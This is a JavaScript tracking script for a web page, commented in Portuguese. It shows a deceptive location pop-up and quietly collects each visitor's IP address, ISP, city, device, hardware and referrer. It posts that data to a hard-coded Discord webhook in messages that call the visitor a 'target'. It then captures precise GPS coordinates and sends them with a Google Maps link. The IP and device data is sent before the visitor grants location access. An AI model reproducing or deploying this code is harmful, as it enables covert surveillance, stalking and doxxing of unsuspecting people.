const WEBHOOK = "https://discord.com/api/webhooks/1512916490637279442/3b3q2iweTkHj2A7_bohtF_z5Shjm1hgMbVKX3AFmXDwbI5t9Qp-ZBH3MX8iIZ5gaMVoN";

console.log("Script carregado - versao 5.0");
console.log("Webhook configurado:", WEBHOOK.substring(0, 50) + "...");

const IPModule = {
  lastIp: null,
  lastTimestamp: null,

  async send(lat, lon) {
    console.log("[IPModule.send] Iniciando envio...");
    try {
      console.log("[IPModule.send] Buscando IP...");
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();
      if (!d.ip) throw new Error("IP missing");

      console.log("[IPModule.send] IP obtido:", d.ip);

      this.lastIp = d.ip;
      this.lastTimestamp = Date.now();

      const nav  = window.navigator;
      const conn = nav.connection || nav.mozConnection || nav.webkitConnection || {};
      const ua   = nav.userAgent;
      const platform = nav.platform || nav.userAgentData?.platform || "Desconhecido";

      // Detectar SO
      let os = "Desconhecido";
      if (ua.includes("Windows NT 10.0")) os = "Windows 10";
      else if (ua.includes("Windows NT 11.0")) os = "Windows 11";
      else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
      else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
      else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
      else if (ua.includes("Windows")) os = "Windows";
      else if (ua.includes("Android")) {
        const match = ua.match(/Android[\s]([0-9.]+)/);
        os = match ? `Android ${match[1]}` : "Android";
      }
      else if (ua.includes("iPhone") || ua.includes("iPad")) {
        const match = ua.match(/OS[\s]([0-9_]+)/);
        os = match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      else if (ua.includes("Mac OS X")) {
        const match = ua.match(/Mac OS X[\s]([0-9_]+)/);
        os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      else if (ua.includes("Ubuntu")) os = "Linux (Ubuntu)";
      else if (ua.includes("Linux")) os = "Linux";

      // Detectar navegador
      let browser = "Desconhecido";
      if (ua.includes("Edg/")) browser = "Microsoft Edge";
      else if (ua.includes("OPR/") || ua.includes("Opera")) browser = "Opera";
      else if (ua.includes("Firefox/")) browser = "Mozilla Firefox";
      else if (ua.includes("Chrome/")) browser = "Google Chrome";
      else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
      else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";

      // Detectar tipo de dispositivo
      let deviceType = "Desktop";
      if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";

      // Detectar modelo
      let deviceModel = "N/A";
      const modelMatch = ua.match(/\(([^)]+)\)/);
      if (modelMatch) {
        const info = modelMatch[1];
        if (info.includes("iPhone")) deviceModel = info.match(/iPhone[^;,]*/)?.[0] || "iPhone";
        else if (info.includes("iPad")) deviceModel = info.match(/iPad[^;,]*/)?.[0] || "iPad";
        else if (info.includes("SM-") || info.includes("SAMSUNG")) {
          deviceModel = info.match(/SM-[A-Z0-9]+|SAMSUNG[^;,]*/)?.[0] || "Samsung";
        }
        else if (info.includes("Pixel")) deviceModel = info.match(/Pixel[^;,]*/)?.[0] || "Google Pixel";
        else if (info.includes("Redmi") || info.includes("Mi ")) deviceModel = info.match(/Redmi[^;,]*|Mi [^;,]*/)?.[0] || "Xiaomi";
      }

      const embed = {
        title: "\ud83d\udea8 NOVO ALVO DETECTADO",
        description: "`Sistema de Rastreamento Ativado`",
        color: 0x00ff00,
        fields: [
          {
            name: "\ud83c\udf10 REDE",
            value: `\`\`\`\nIP:        ${d.ip}\nISP:       ${d.org || "N/A"}\nPa\u00eds:      ${d.country || "N/A"}\nRegi\u00e3o:     ${d.region || "N/A"}\nCidade:    ${d.city || "N/A"}\nCEP:       ${d.postal || "N/A"}\nTimezone:  ${d.timezone || "N/A"}\n\`\`\``,
            inline: false
          },
          {
            name: "\ud83d\udcbb DISPOSITIVO",
            value: `\`\`\`\nTipo:      ${deviceType}\nModelo:    ${deviceModel}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
            inline: true
          },
          {
            name: "\u2699\ufe0f HARDWARE",
            value: `\`\`\`\nCPU:       ${nav.hardwareConcurrency || "N/A"} cores\nRAM:       ${nav.deviceMemory || "N/A"} GB\nTela:      ${window.screen.width}x${window.screen.height}\nTouch:     ${nav.maxTouchPoints > 0 ? "Sim" : "N\u00e3o"}\n\`\`\``,
            inline: true
          },
          {
            name: "\ud83d\udd17 NAVEGA\u00c7\u00c3O",
            value: `\`\`\`\nURL:       ${location.href}\nReferrer:  ${document.referrer || "Direto"}\n\`\`\``,
            inline: false
          }
        ],
        footer: {
          text: "Status: Aguardando Coordenadas GPS...",
          icon_url: "https://cdn-icons-png.flaticon.com/512/3064/3064197.png"
        },
        timestamp: new Date().toISOString()
      };

      console.log("[IPModule.send] Enviando embed para webhook...");
      const webhookResponse = await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "SECURITY SYSTEM",
          avatar_url: "https://cdn-icons-png.flaticon.com/512/6195/6195699.png",
          embeds: [embed]
        })
      });
      
      console.log("[IPModule.send] Resposta:", webhookResponse.status, webhookResponse.statusText);
      
      if (!webhookResponse.ok) {
        console.error("[IPModule.send] ERRO:", await webhookResponse.text());
      } else {
        console.log("[IPModule.send] Sucesso!");
      }
    } catch (err) {
      console.error("[IPModule.send] ERRO:", err.message, err);
    }
  },

  async sendUpdate(lat, lon) {
    console.log("[IPModule.sendUpdate] Iniciando atualização com localização...");
    if (!this.lastIp || !this.lastTimestamp) {
      console.error("[IPModule.sendUpdate] Dados anteriores não encontrados!");
      return;
    }

    try {
      const res = await fetch("https://ipinfo.io/json");
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const d = await res.json();

      const nav  = window.navigator;
      const ua   = nav.userAgent;

      let os = "Desconhecido";
      if (ua.includes("Windows NT 10.0")) os = "Windows 10";
      else if (ua.includes("Windows NT 11.0")) os = "Windows 11";
      else if (ua.includes("Android")) {
        const match = ua.match(/Android[\s]([0-9.]+)/);
        os = match ? `Android ${match[1]}` : "Android";
      }
      else if (ua.includes("iPhone") || ua.includes("iPad")) {
        const match = ua.match(/OS[\s]([0-9_]+)/);
        os = match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      else if (ua.includes("Mac OS X")) {
        const match = ua.match(/Mac OS X[\s]([0-9_]+)/);
        os = match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      else if (ua.includes("Linux")) os = "Linux";

      let browser = "Desconhecido";
      if (ua.includes("Edg/")) browser = "Edge";
      else if (ua.includes("Firefox/")) browser = "Firefox";
      else if (ua.includes("Chrome/")) browser = "Chrome";
      else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";

      let deviceType = "Desktop";
      if (/Mobile|Android|iPhone/i.test(ua)) deviceType = "Smartphone";
      else if (/iPad|Tablet/i.test(ua)) deviceType = "Tablet";

      const embed = {
        title: "🎯 COORDENADAS GPS OBTIDAS!",
        description: "`Localização Precisa Capturada`",
        color: 0xff0000,
        fields: [
          {
            name: "📍 LOCALIZAÇÃO GPS",
            value: `\`\`\`\nLatitude:  ${lat.toFixed(6)}\nLongitude: ${lon.toFixed(6)}\n\`\`\`\n[📍 Ver no Google Maps](https://maps.google.com/?q=${lat},${lon})`,
            inline: false
          },
          {
            name: "🌐 INFORMAÇÕES",
            value: `\`\`\`\nIP:        ${d.ip}\nCidade:    ${d.city || "N/A"}\nDispositivo: ${deviceType}\nSistema:   ${os}\nNavegador: ${browser}\n\`\`\``,
            inline: false
          }
        ],
        thumbnail: {
          url: `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=400x400&markers=color:red%7C${lat},${lon}&key=AIzaSyDummy`
        },
        footer: {
          text: "✅ Status: Alvo Completamente Rastreado",
          icon_url: "https://cdn-icons-png.flaticon.com/512/4436/4436481.png"
        },
        timestamp: new Date().toISOString()
      };

      console.log("[IPModule.sendUpdate] Enviando atualização...");
      const webhookResponse = await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: "GPS TRACKER",
          avatar_url: "https://cdn-icons-png.flaticon.com/512/684/684908.png",
          embeds: [embed]
        })
      });
      
      console.log("[IPModule.sendUpdate] Resposta:", webhookResponse.status, webhookResponse.statusText);
      
      if (!webhookResponse.ok) {
        console.error("[IPModule.sendUpdate] ERRO:", await webhookResponse.text());
      } else {
        console.log("[IPModule.sendUpdate] Sucesso!");
      }
    } catch (err) {
      console.error("[IPModule.sendUpdate] ERRO:", err.message, err);
    }
  },
};

const CookieModule = {
  init() {
    const overlay = document.getElementById("location-overlay");
    const allow   = document.getElementById("location-allow");

    console.log("CookieModule iniciado", overlay, allow);

    if (!overlay || !allow) {
      console.error("Elementos não encontrados!");
      return;
    }

    overlay.style.display = "flex";
    console.log("Popup de localização exibido");

    allow.addEventListener("click", () => {
      console.log("Botão clicado, aguardando permissão...");
      
      // Envia dados imediatamente sem localização
      IPModule.send(null, null);
      
      // Verifica suporte a geolocalização (todos navegadores)
      if ("geolocation" in navigator) {
        // Opções compatíveis com todos os navegadores
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        };
        
        // Timeout manual caso o navegador não responda
        const fallbackTimeout = setTimeout(() => {
          console.log("Timeout: usuário não respondeu");
          overlay.style.display = "none";
        }, 20000);
        
        navigator.geolocation.getCurrentPosition(
          // Sucesso
          (pos) => {
            clearTimeout(fallbackTimeout);
            console.log("Localização autorizada", pos.coords);
            overlay.style.display = "none";
            IPModule.sendUpdate(pos.coords.latitude, pos.coords.longitude);
          },
          // Erro
          (error) => {
            clearTimeout(fallbackTimeout);
            const errorMsg = {
              1: "Permissão negada pelo usuário",
              2: "Posição indisponível",
              3: "Timeout ao obter localização"
            };
            console.log("Erro de localização:", errorMsg[error.code] || "Erro desconhecido");
            overlay.style.display = "none";
          },
          options
        );
      } else {
        console.log("Geolocalização não suportada neste navegador");
        overlay.style.display = "none";
      }
    });
  },
};

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", () => CookieModule.init());
} else {
  CookieModule.init();
}

// Modal de link externo
const linkOverlay = document.getElementById("link-overlay");
if (linkOverlay) {
  const urlText    = document.getElementById("link-url-text");
  const btnConfirm = document.getElementById("link-confirm");
  const btnCancel  = document.getElementById("link-cancel");
  let pendingUrl   = null;

  document.addEventListener("click", (e) => {
    const a = e.target.closest("a");
    if (!a) return;
    e.preventDefault();
    pendingUrl = a.href;
    urlText.textContent = pendingUrl;
    linkOverlay.style.display = "flex";
  });

  btnConfirm.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    if (pendingUrl) window.location.href = pendingUrl;
  });

  btnCancel.addEventListener("click", () => {
    linkOverlay.style.display = "none";
    pendingUrl = null;
  });
}
